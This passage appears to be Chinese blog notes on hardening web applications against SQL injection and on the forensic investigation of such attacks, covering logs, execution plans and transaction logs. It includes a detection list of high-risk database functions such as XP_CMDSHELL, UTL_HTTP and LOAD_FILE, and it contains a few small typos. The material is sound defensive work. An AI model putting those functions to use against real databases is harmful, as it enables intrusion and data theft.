<h5 id="确保数据库服务器软件打了补丁"><a href="#确保数据库服务器软件打了补丁" class="headerlink" title="确保数据库服务器软件打了补丁"></a>确保数据库服务器软件打了补丁</h5><p>使用当前的补丁保证软件更新至最新是一项基本的安全规则</p>
<p>判定SQL Server/Oracle数据库服务器版本</p>
<table>
<thead>
<tr>
<th align="center">数据库</th>
<th align="center">命令</th>
<th align="center">版本查阅</th>
</tr>
</thead>
<tbody><tr>
<td align="center">SQL Server</td>
<td align="center">select @@version</td>
<td align="center"><a target="_blank" rel="noopener" href="http://support.microsoft.com/kb/321185">http://support.microsoft.com/kb/321185</a></td>
</tr>
<tr>
<td align="center">Oracle</td>
<td align="center">– 显示数据库版本 select * from v$version; – 显示已安装组件的版本 select * from dba_registry; – 显示补丁级别 select * from dba_registry_history;</td>
<td align="center"><a target="_blank" rel="noopener" href="http://www.oracle.com/techwrnetwork/topics/security/alerts-086861.html">http://www.oracle.com/techwrnetwork/topics/security/alerts-086861.html</a></td>
</tr>
</tbody></table>
<h3 id="额外的部署考虑"><a href="#额外的部署考虑" class="headerlink" title="额外的部署考虑"></a>额外的部署考虑</h3><h4 id="最小化不必要信息的泄露"><a href="#最小化不必要信息的泄露" class="headerlink" title="最小化不必要信息的泄露"></a>最小化不必要信息的泄露</h4><h5 id="隐藏错误消息"><a href="#隐藏错误消息" class="headerlink" title="隐藏错误消息"></a>隐藏错误消息</h5><p>包含描述数据库服务器失败原因信息的错误消息对SQL注入识别和后续的漏洞利用均非常有用。在应用程序级别的错误处理程序中，处理异常和错误消息隐藏会极其有效。好的做法是配置应用框架或Web服务器，以便在产生未预料的应用程序错误（比如包含500状态码的HTTP响应）时返回自定义响应。配置后的响应可以是显示通用消息的自定义错误页面，也可以重定向到默认的Web页面。</p>
<p>自定义错误的配置技术</p>
<table>
<thead>
<tr>
<th align="center">平   台</th>
<th align="center">配置指令</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ASP.NET Web应用程序</td>
<td align="center">在 web.config 文件中，将customErrors 设置为 On 或 RemoteOnly  并将defaultRedirect设置为要显示的页面。确保为defaultRedirect配置的页面确实位于配置的位置，这通常容易出错！<br>  <code>&lt;customErrors  mode="On"  defaultRedirect="/CustomPage.aspx"&gt;  &lt;/customErrors&gt;</code><br>  该配置只适用于ASP.NET资源。当出现任何应用代码无法处理的错误（500、404等）时均会显示该配置页面。</td>
</tr>
<tr>
<td align="center">J2EE Web应用程序</td>
<td align="center">在web.xml文件中，使用<code>&lt;error-code&gt;</code>和<code>&lt;location&gt;</code>元素配置<code>&lt;error-page&gt;</code>元素：<br><error-page><br><error-code>500</error-code><br><location>/CustomPage.html</location><br></error-page><br>该配置只适用于专门由Java应用服务器处理的资源。只有当出现500错误时才会显示该配置页面。</td>
</tr>
<tr>
<td align="center">经典ASP/VBScript  Web应用程序</td>
<td align="center">必须对IIS进行配置以便隐藏详细的ASP错误消息。可以使用下列操作配置该设置：<br>1. 在”IIS Manager Snap-In”中右击Web站点并选择”Properties”。<br>2.在”Home Directory”选项卡中单击”Configuration”按钮。确保选中了”Send text error message to client”选项，并且该选项下的文本框中存在恰当的消息。</td>
</tr>
<tr>
<td align="center">PHP Web应用程序</td>
<td align="center">在php.ini文件中，设置display_errors为Off。此外，在Web服务器配置中配置默认的错误文档。请参考下面两行表格中针对Apache和 IIS的指令。</td>
</tr>
<tr>
<td align="center">Apache Web服务器</td>
<td align="center">向指向自定义页面的Apache（位于配置文件内部，通常为httpd.conf） 添加 ErrorDocument 指令：  <code>ErrorDocument 500 /CustomPage.html</code></td>
</tr>
<tr>
<td align="center">IIS服务器</td>
<td align="center">可以使用下列操作配置IIS中的自定义错误：<br>（1）在”IIS Manager Snap-In”中右击Web站点并选择”Properties”。<br>（2）在”Custom Errors”选项卡中单击”Configuration”按钮。选中需要自定义的HTTP错误并单击”Edit”按钮。接下来从”Message Type”<br>下拉菜单中选择一个文件或URL来替换默认内容</td>
</tr>
</tbody></table>
<p>一种可以使基于响应的错误检测变得困难的方法，是配置应用程序和Web服务器，使之返回相同的响应，比如不管什么错误代码（401、403、500等）均重定向到默认的首页。</p>
<h5 id="使用空的默认Web站点"><a href="#使用空的默认Web站点" class="headerlink" title="使用空的默认Web站点"></a>使用空的默认Web站点</h5><p>HTTP/1.1协议要求HTTP客户端在发送给Web服务器的请求中发送主机头部（Host header）。为访问特定的Web站点，该头部值必须与Web服务器的虚拟主机配置中的主机名相匹配。如果未找到匹配值，将返回默认的Web站点内容。</p>
<p>对于企业级Web应用程序的拥有者，则可能更喜欢隐蔽起来，他们不希望被针对端口80和443进行IP地址范围扫描的攻击者发现。为确保用户只能通过主机名连接到Web应用，需要将Web服务器的默认Web站点配置成返回一个空白的默认Web页面。</p>
<h5 id="为DNS反向查询使用虚拟主机名称"><a href="#为DNS反向查询使用虚拟主机名称" class="headerlink" title="为DNS反向查询使用虚拟主机名称"></a>为DNS反向查询使用虚拟主机名称</h5><p>前面讲过，如果只拥有IP地址，要想在能够访问Web站点之前发现有效的主机名，就需要花费一些功夫。要实现该目标，一种方法是在IP地址上执行反向DNS查询。如果IP地址被解析成在Web服务器上同样有效的主机名，那么我们就拥有了连接到该Web站点所需要的信息。不过，如果反向查询返回了稍微通用的内容，那么这时可通过反向DNS查询来阻止不受欢迎的攻击者发现我们的Web站点。如果正在使用虚拟主机名（Dummy Host Name）技术，请确保默认的Web站点也被配置成返回一个空白的默认Web页面。</p>
<h5 id="使用通配符SSL证书"><a href="#使用通配符SSL证书" class="headerlink" title="使用通配符SSL证书"></a>使用通配符SSL证书</h5><p>另一种发现有效主机名的方法是从SSL（Secure Sockets Layer,安全套接字层）证书中提取。 要阻止该操作，一种方法是使用通配符SSL证书。</p>
<h5 id="限制通过搜索引擎hacking得到的发现"><a href="#限制通过搜索引擎hacking得到的发现" class="headerlink" title="限制通过搜索引擎hacking得到的发现"></a>限制通过搜索引擎hacking得到的发现</h5><p>搜索引擎是攻击者用于寻找Web站点中SQL注入漏洞的另一种工具。在所有主流搜索引擎中，常见的技术是使用Web站点根目录中的robots.txt文件。该文件用于阻止爬行器（crawler）编写站点索引。</p>
<p>阻止所有机器人爬行Web站点上的所有页面：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">User-agent: *
Disallow: /<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="禁止WSDL信息"><a href="#禁止WSDL信息" class="headerlink" title="禁止WSDL信息"></a>禁止WSDL信息</h5><p>Web服务所支持的通信协议（例如，SOAP、HTTP GET等）、方法名和期望的参数，都可以从Web服务的WSDL（Web Services Description Language, Web服务描述语言）文件中提取到。通常，通过在Web服务URL的结尾添加一个?WSDL来调用该文件。好的做法是尽可能向不受欢迎的攻击者隐藏这一信息。</p>
<p>下面展示了如何配置一个.NET Web服务以便不显示WSDL，可以对该配置进行修改以便应用到应用的web.config或machine.config文件中：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>webServices</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>protocols</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>remove</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Documentation<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>protocols</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>webServices</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Apache Axis（Java应用经常使用的一种SOAP（简单对象访问协议，Web服务平台）支持自定义配置WSDL文件，用于阻止自动生成WSDL，可以在服务的WSDD（Web服务描述文档）文件中配置wsdlFile设置以指向返回空<code>&lt;wsdl/&gt;</code>标签的文件。</p>
<p>坚决反对在面向Internet的Web服务器上保持WSDL信息的远程访问。可以使用可选的安全通信通道（比如加密过的e-mail）来向值得信赖的合作者提供该文件，合作者可能需要这些信息以与Web服务进行通信。</p>
<h4 id="提高Web服务器日志的详细程度"><a href="#提高Web服务器日志的详细程度" class="headerlink" title="提高Web服务器日志的详细程度"></a>提高Web服务器日志的详细程度</h4><p>Web服务器日志文件可以提供一些洞察潜在SQL注入攻击的信息，尤其是当应用程序日志记录机制不佳时。</p>
<h4 id="将Web服务器和数据库服务器分别部署在独立主机上"><a href="#将Web服务器和数据库服务器分别部署在独立主机上" class="headerlink" title="将Web服务器和数据库服务器分别部署在独立主机上"></a>将Web服务器和数据库服务器分别部署在独立主机上</h4><p>应该避免在同一主机上运行Web服务器软件和数据库服务器软件，因为这样会显著增加Web应用的攻击面，并将之前只访问Web前端时不可能暴露的数据库服务器软件暴露给攻击程序。</p>
<h4 id="配置网络访问控制"><a href="#配置网络访问控制" class="headerlink" title="配置网络访问控制"></a>配置网络访问控制</h4><p>在分层正确的网络中，数据库服务器通常位于内部受信任网络中。凭借对数据库服务器的直接访问权，攻击者可以尝试连接到同一网络的其他系统。 实现网络访问控制，以便对与内部网中其他系统的连接施加限制。可以在包含防火墙和路由器 ACL的网络层实现该控制，也可以使用IPSec这样的主机层机制来实现该控制。此外，确保施加合适的网络访问控制以阻止带外（outbound）网络连接。</p>
<h2 id="确认并从SQL注入攻击中恢复"><a href="#确认并从SQL注入攻击中恢复" class="headerlink" title="确认并从SQL注入攻击中恢复"></a>确认并从SQL注入攻击中恢复</h2><h3 id="调查可疑的SQL注入攻击"><a href="#调查可疑的SQL注入攻击" class="headerlink" title="调查可疑的SQL注入攻击"></a>调查可疑的SQL注入攻击</h3><p>在遇到可疑的攻击之后，调查者需要筛选大量信息，不但需要判断是否存在SQL注入攻击企图的证据，还需要判断这种攻击是否成功。</p>
<h4 id="取证的合理实践"><a href="#取证的合理实践" class="headerlink" title="取证的合理实践"></a>取证的合理实践</h4><p>收集和管理数字化的证据都有着严格的规则和指导原则。常见的要求包括：</p>
<ol>
<li><p>应该由接受过计算机取证培训并在机构中授权执行数字调查的人来处理调查事宜。</p>
</li>
<li><p>在调查期间收集的所有文件，应该镜像，并且应该创建镜像的副本用于分析。这可以确保在需要时总有原始镜像可用。</p>
</li>
<li><p>对于新创建的每一份文件镜像，应该为之生成哈希，对于每个源文件也是如此。</p>
</li>
<li><p>在调查期间，用文档记录你所执行的所有操作，包括那些当连接到数据库服务器时完成的操作：保留连接时间和所用数据库语境的记录；保留在RDBMS中执行命令的记录；将所有结果管道(pipe)重定向到文本文件中。主流RDBMS客户端将标准输出重定向的命令。</p>
</li>
<li><p>确保将所有证据都写入无毒的存储介质，并将其保存在一个安全的地方，比如储物柜或保险箱。</p>
</li>
<li><p>维护一份监管链(Chain of Custody)文档，用于跟踪收集的所有证据，从被防护时间开始直到作为证据在法庭上呈现时的移动、存放位置和所有者。</p>
</li>
</ol>
<p>主流RDBMS客户端重定向stdout的命令</p>
<table>
<thead>
<tr>
<th align="center">RDBMS</th>
<th align="center">厂商支持的客户端</th>
<th align="center">日志记录的会话活动</th>
<th align="center">重定向操作符</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Microsoft  SQL Server</td>
<td align="center">SQLCMD</td>
<td align="center">-e命令，当启动SQLCMD时， 它在标准输出(stdout)上回显所有发送给服务器的语句和查询。例如：<br>  <code>SQLCMD  -e</code></td>
<td align="center">控制台中使用:out输出命令，将把标准输出(stdout)重定向到指定的文件。例如：<br><code>SQLCMD&gt;:out  z:\queryresults.txt  &lt;query&gt;  </code></td>
</tr>
<tr>
<td align="center">Oracle</td>
<td align="center">SQL*Plus</td>
<td align="center">在SQL*Plus中使用 ECHO  ON命令。例如：<br>  <code>SQL&gt; SET ECHO ON  </code></td>
<td align="center">在SQL*Plus中使用spool命令。  例如： <br> <code>SQL&gt; spool  z:\queryresults.txt</code></td>
</tr>
<tr>
<td align="center">MySQL</td>
<td align="center">MySQL命令行客户端</td>
<td align="center">Tee选项。  例如： <br><code>Tee z:\response\  logofactions.txt</code></td>
<td align="center">INTO OUTFILE 语句。  例如：<br>  <code>&lt;query&gt; INTO  OUTFILE z:\queryresults.txt</code></td>
</tr>
<tr>
<td align="center">PostgreSQL</td>
<td align="center">PostgreSQL  shell</td>
<td align="center">在 PostgreSQL  中使用  ECHO  选项。  例如：<br>  <code>\set ECHO all  </code></td>
<td align="center">在PostgreSQL  shell中使用/g参数。 例如：<br> <code>=# &lt;query&gt;  /g z:\queryresults.txt</code></td>
</tr>
</tbody></table>
<h4 id="分析数字化证据"><a href="#分析数字化证据" class="headerlink" title="分析数字化证据"></a>分析数字化证据</h4><p>数字化证据(digital artifact)就是相关数据的集合。它们的范围很广，包括从存储在操作系统中文件系统内的Web服务器的日志文件，到存储在内存中的信息，以及RDBMS内核中的信息。</p>
<h5 id="Web服务器日志文件"><a href="#Web服务器日志文件" class="headerlink" title="Web服务器日志文件"></a>Web服务器日志文件</h5><p>Web服务器是基于Web的应用程序的核心组件，作为交互层接受用户的输入并将输入传递给后台应用程序。Web服务器通常维护着持久日志文件，其中包含它接收到的页面请求的历史记录，以及以状态码形式记录的对该请求处理后产生的输出。</p>
<p>对于调查SQL注入攻击最有用的Web服务器日志属性</p>
<table>
<thead>
<tr>
<th align="center">日志字段名</th>
<th align="center">描述</th>
<th align="center">主要调查的值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Date</td>
<td align="center">活动的日期</td>
<td align="center">建立事件的时间基线，并在各种证据中将事件关联起来</td>
</tr>
<tr>
<td align="center">Time</td>
<td align="center">活动的时间</td>
<td align="center">建立事件的时间基线，并在各种证据中将事件关联起来</td>
</tr>
<tr>
<td align="center">Client-IP Address (c-ip)</td>
<td align="center">发起请求的客户端的IP地址</td>
<td align="center">标识Web请求的源</td>
</tr>
<tr>
<td align="center">Cs-UserName</td>
<td align="center">发起请求的已授权的用户名</td>
<td align="center">标识与流量关联的用户上下文(context)</td>
</tr>
<tr>
<td align="center">Cs-method</td>
<td align="center">请求的操作(action)</td>
<td align="center">客户端试图执行的HTTP操作</td>
</tr>
<tr>
<td align="center">Cs-uri-stem</td>
<td align="center">请求目标(例如请求的Web页面)</td>
<td align="center">客户端请求访问的资源(页面、可执行文件等)</td>
</tr>
<tr>
<td align="center">Cs-uri-query</td>
<td align="center">客户端请求的查询</td>
<td align="center">标识客户端提交的恶意查询</td>
</tr>
<tr>
<td align="center">Sc-status</td>
<td align="center">客户端请求的状态码</td>
<td align="center">标识处理客户端请求后产生的输出  (状态)</td>
</tr>
<tr>
<td align="center">Cs(User-Agent)</td>
<td align="center">客户端浏览器的版本</td>
<td align="center">追踪特定客户端的请求，该客户端可 能使用了多个IP地址</td>
</tr>
<tr>
<td align="center">Cs-bytes</td>
<td align="center">客户端发送给服务器的字节</td>
<td align="center">标识异常的流量传输</td>
</tr>
<tr>
<td align="center">Sc-bytes</td>
<td align="center">服务器发送给客户端的字节</td>
<td align="center">标识异常的流量传输</td>
</tr>
<tr>
<td align="center">Time Taken (time-taken)</td>
<td align="center">服务器执行请求所花的毫秒数</td>
<td align="center">标识异常请求处理的实例</td>
</tr>
</tbody></table>
<p>分析日志文件的要点</p>
<ul>
<li>每天的带宽利用率</li>
<li>页面每天命中次数</li>
<li>页面每天被每个IP命中的次数</li>
<li>恶意查询参数</li>
<li>spear-searching</li>
</ul>
<h5 id="数据库执行计划"><a href="#数据库执行计划" class="headerlink" title="数据库执行计划"></a>数据库执行计划</h5><p>数据库执行计划是由RDBMS生成的执行步骤的列表，它说明了 RDBMS在访问或修改信息时效率最高的方式。</p>
<h6 id="在缓存的执行计划中查找证据"><a href="#在缓存的执行计划中查找证据" class="headerlink" title="在缓存的执行计划中查找证据"></a>在缓存的执行计划中查找证据</h6><ul>
<li>寻找已知恶意攻击活动的痕迹</li>
<li>与注释协同使用的堆叠查询</li>
<li>非法使用条件语句</li>
<li>高风险语句和数据库函数</li>
</ul>
<table>
<thead>
<tr>
<th>数据库</th>
<th>函  数</th>
</tr>
</thead>
<tbody><tr>
<td>Microsoft SQL Server</td>
<td>XP_CMDSHELL<br>XP_reg*<br>SP_OACREATE<br>sp_OAMethod<br>OPENROWSET<br>sp_configure<br>BULK INSERT<br>BCP<br>WAITFOR DELAY</td>
</tr>
<tr>
<td>Oracle</td>
<td>UTL_FILE<br>UTL_HTTP<br>HTTPURITYPE<br>UTL_INADDR</td>
</tr>
<tr>
<td>MySQL</td>
<td>LOAD_DATA_INFILE<br>LOAD_FILE<br>BENCHMARK<br>ENCODE()<br>OUTFILE()<br>CONCAT()</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>pg_Is_dir<br>pg_read_file<br>pg_read_binary_file<br>pg_stat_file<br>pg_sleep</td>
</tr>
</tbody></table>
<h6 id="如何访问执行计划"><a href="#如何访问执行计划" class="headerlink" title="如何访问执行计划"></a>如何访问执行计划</h6><p>RDBMS数据库提供的视图，用于访问存储的执行计划</p>
<table>
<thead>
<tr>
<th>数据库</th>
<th>缓存的语句类型</th>
<th align="center">默认是否启用</th>
<th>访问方法</th>
</tr>
</thead>
<tbody><tr>
<td>Microsoft SQL Server</td>
<td>即席奪询(ad  hoc)和预处理语句(prepared  statement)</td>
<td align="center">启用</td>
<td>sys.dmexecquerystats  sys.dmexecsqltext</td>
</tr>
<tr>
<td>Oracle</td>
<td>即席查询（ad hoc）和预处理语句</td>
<td align="center">启用</td>
<td>gv$sql</td>
</tr>
<tr>
<td>MySQL</td>
<td>预处理语句</td>
<td align="center">不启用</td>
<td>没有直接访问方法，使用普通的日志查询</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>预处理语句</td>
<td align="center">不启用</td>
<td>没有直接访问方法，使用普通的日志查询</td>
</tr>
</tbody></table>
<ul>
<li>Microsoft SQL Server</li>
</ul>
<p>  使用视图返回了执行计划缓存条目创建的日期和时间、最后一次执行的时间（在重复执行的情况下）、执行的语法和执行计划被重用的次数</p>
  <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> creation_time<span class="token punctuation">,</span> last_execution_time<span class="token punctuation">,</span> <span class="token keyword">text</span><span class="token punctuation">,</span> execution_count <span class="token keyword">from</span> sys<span class="token punctuation">.</span>dm_exec_query_stats qs <span class="token keyword">CROSS</span> <span class="token keyword">APPLY</span> sys<span class="token punctuation">.</span>dm_exec_sql_text<span class="token punctuation">(</span>qs<span class="token punctuation">.</span>sql_handle<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><p>Oracle </p>
<p>使用GVSSQL视图</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> sql_text <span class="token keyword">from</span> gv$<span class="token keyword">sql</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>MySQL</p>
<p>使用show variables命令来查看查询日志的状态</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%general_log%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>PostgreSQL</p>
<p>使用下面的查询来判断服务器上的log_statement值是否已经启用，如果已经启用，可以看到曰志的位置</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span> setting <span class="token keyword">from</span> pg_settings <span class="token keyword">where</span> name <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'log_statement'</span><span class="token punctuation">,</span><span class="token string">'log_directory'</span><span class="token punctuation">,</span><span class="token string">'log_filename'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<h6 id="执行计划的局限"><a href="#执行计划的局限" class="headerlink" title="执行计划的局限"></a>执行计划的局限</h6><p>在PostgreSQL和MySQL中，执行计划默认是被禁用的。除此之外，具有足够权限的攻击者还可以禁用执行计划。Microsoft SQL Server和Oracle不允许禁用执行计划，但是执行计划受到本地RDBMS回收策略的支配，使用特殊的RDBMS函数可以将执行计划清洗掉。</p>
<h6 id="缓存回收策略"><a href="#缓存回收策略" class="headerlink" title="缓存回收策略"></a>缓存回收策略</h6><p>可以控制执行计划缓存的存储容量。RDBMS会根据一些因素来清除缓存的条目</p>
<ul>
<li><p>数据库服务器的CPU和内存负载</p>
</li>
<li><p>执行计划重用的频率</p>
</li>
<li><p>缓存执行计划中引用的对象发生了改变</p>
</li>
<li><p>重启数据库服务</p>
</li>
</ul>
<h6 id="手工清洗缓存"><a href="#手工清洗缓存" class="headerlink" title="手工清洗缓存"></a>手工清洗缓存</h6><p>具有管理员权限的用户可以使用手工方式清洗数据库的执行计划缓存。</p>
<p>采用参数化处理可以提高RDBMS重用缓存计划的机会，以便将来遇到同样的查询时可以更快地执行。下面是一个参数化查询的例子：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> EmployeeID<span class="token punctuation">,</span> FName<span class="token punctuation">,</span> LName<span class="token punctuation">,</span> YOB <span class="token keyword">from</span> SSFA<span class="token punctuation">.</span>Employee <span class="token keyword">where</span> <span class="token punctuation">[</span>fname<span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">'mike'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="事务日志"><a href="#事务日志" class="headerlink" title="事务日志"></a>事务日志</h5><p>数据库操作分为两个主要的类别：一是数据操作语言(Data Manipulation Language, DML)， 二是数据定义语言(Data Definition Language, DDL)。DML作用于表内的数据；而DDL则作用于数据库的结构，比如创建新表。</p>
<p>事务日志(transaction log)用于记录这样的事实：事务开始发生及恢复所需的信息。万一数据库服务器将信息写入硬盘失败，数据库服务器就可以使用这些恢复信息将数据回退到某个一致的状态。</p>
<p>将数据写入实际的数据页(data page)并不是实时发生的。在预定义的时间间隔之后，事务 日志中的信息才会应用于硬盘，这等同于数据的写入操作，但却提高了总体的性能。这听起来 很复杂，但与RDBMS在巨大的数据库文件中寻道并在恰当区域中写入信息相比，写入事务曰 志的速度要快许多。</p>
<h6 id="在事务日志中查找证据"><a href="#在事务日志中查找证据" class="headerlink" title="在事务日志中查找证据"></a>在事务日志中查找证据</h6><p>分析事务日志</p>
<ul>
<li><p>在可疑攻击时间段内执行的INSERT, UPDATE和DELETE语句。在调查取证时，该信息可用于标识在所调查的时间段内执行的活动，以及相关事件的其他痕迹。</p>
</li>
<li><p>数据库用户执行的非标准的数据库操作(当事务日志中有可用信息时)。例如，某个通常从数据库读取信息的应用程序用户账号突然意外地开始执行INSERT、UPDATE和 DELETE 语句。</p>
</li>
</ul>
<h6 id="如何搜索主流RDBMS的事务日志"><a href="#如何搜索主流RDBMS的事务日志" class="headerlink" title="如何搜索主流RDBMS的事务日志"></a>如何搜索主流RDBMS的事务日志</h6><ul>
<li><p>Microsoft SQL Server </p>
<p>默认情况下，Microsoft SQL Server的事务日志功能是启用的，而且无法禁用。从任何SQL Server客户端，都可以使用原生的fh_dblog函数来访问事务日志。</p>
<p>列出了针对用户表已经执行事务的汇总信息</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> AllocUnitName <span class="token keyword">as</span> <span class="token string">'Object'</span><span class="token punctuation">,</span> Operation<span class="token punctuation">,</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>OPERATION<span class="token punctuation">)</span> <span class="token keyword">AS</span>
<span class="token string">'Count'</span> <span class="token keyword">from</span> fn_dblog<span class="token punctuation">(</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span> <span class="token keyword">WHERE</span> OPERATION <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'LOP_INSERT_ROWS'</span><span class="token punctuation">,</span><span class="token string">'LOP_MODIFY_ROW'</span><span class="token punctuation">,</span><span class="token string">'LOP_DELETE_ROWS'</span><span class="token punctuation">)</span> <span class="token operator">and</span> AllocUnitName <span class="token operator">NOT</span>
<span class="token operator">Like</span> <span class="token string">'sys.%'</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> Operation<span class="token punctuation">,</span> AllocUnitName <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> Object<span class="token punctuation">,</span> Operation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>Oracle</p>
<p>在Oracle中，事务(归档)日志默认是启用的，并且在测试系统时也无法禁用事务日志功能。</p>
<p>使用下面的查询返回已执行的INSERT、UPDATE和DELETE操作的一个列表：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> OPERATION<span class="token punctuation">,</span> SQL_REDO<span class="token punctuation">,</span> SQL_UNDO <span class="token keyword">FROM</span> V$LOGMNR_CONTENTS <span class="token keyword">WHERE</span>
SEG_OWNER <span class="token operator">=</span> <span class="token string">'WEBAPP'</span> <span class="token operator">AND</span> SEG_NAME <span class="token operator">=</span> <span class="token string">'SYNGRESS'</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">timestamp</span> <span class="token operator">&gt;</span> sysdate <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">timestamp</span> <span class="token operator">&lt;</span> sysdate<span class="token punctuation">)</span> <span class="token operator">AND</span> OPERATION <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'DELETE'</span><span class="token punctuation">,</span>
<span class="token string">'INSERT'</span><span class="token punctuation">,</span> <span class="token string">'UPDATE'</span><span class="token punctuation">)</span><span class="token operator">AND</span> USERNAME <span class="token operator">=</span> <span class="token string">'KEWIE'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>MySQL</p>
<p>在MySQL中，默认情况下不启用事务日志，为了记录事务，必须用命令启用事务日志功能。</p>
<p>使用show binary logs语句来查看是否激活了事务日志功能</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> <span class="token keyword">BINARY</span> LOGS<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用下面的查询来确定事务日志存储的位置</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'%HOME%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如何返回DB_BIN_Log.000002文件中的所有事务记录</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysqlbinlog <span class="token string">"c:\Program Files\MySQL\DB_Bin_Logs.000002"</span> <span class="token operator">&gt;</span> z:\transactionlog<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>PostgreSQL</p>
<p>可以使用PostgreSQL命令行客户端来返回事务日志信息。在PostgreSQL中，事务日志默认是不启用的，在启用了 PostgreSQL的事务日志之后，也可以再将其禁用。</p>
</li>
</ul>
<h5 id="数据库对象的时间戳"><a href="#数据库对象的时间戳" class="headerlink" title="数据库对象的时间戳"></a>数据库对象的时间戳</h5><p>在调查取证期间，生成关键对象和相应时间戳的列表是个好办法，这可以在可疑攻击时间段内标识对象的创建和修改活动。在调查可疑的SQL注入攻击时，请注意下列常常与攻击有关的活动：</p>
<ul>
<li><p>创建用户账号，这通常用于创建访问的后门。</p>
</li>
<li><p>为已有账号增加权限，这通常是执行权限提升的一部分操作。 </p>
</li>
<li><p>创建表，新创建的表通常用于在将信息返回给攻击者之前，存储中间结果。</p>
</li>
</ul>
<h6 id="SQL-Server-4"><a href="#SQL-Server-4" class="headerlink" title="SQL Server"></a>SQL Server</h6><p>下面的查询将返回当前数据库中视图、过程、函数、表和扩展过程的一个列表，并按照修改日期和创建日期以降序方式排序：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span><span class="token keyword">select</span> sob<span class="token punctuation">.</span>name <span class="token keyword">as</span> <span class="token string">'object'</span><span class="token punctuation">,</span> sch<span class="token punctuation">.</span>name <span class="token keyword">as</span> <span class="token string">'schema'</span><span class="token punctuation">,</span> type_desc<span class="token punctuation">,</span> create_date<span class="token punctuation">,</span> modify_date <span class="token keyword">from</span> sys<span class="token punctuation">.</span>all_objects sob<span class="token punctuation">,</span> sys<span class="token punctuation">.</span>schemas sch <span class="token keyword">WHERE</span> sob<span class="token punctuation">.</span>schema_id <span class="token operator">=</span> sch<span class="token punctuation">.</span>schema_id <span class="token operator">and</span> sob<span class="token punctuation">.</span><span class="token keyword">type</span> <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">'V'</span><span class="token punctuation">,</span>
<span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'FN'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'IT'</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">UNION</span>
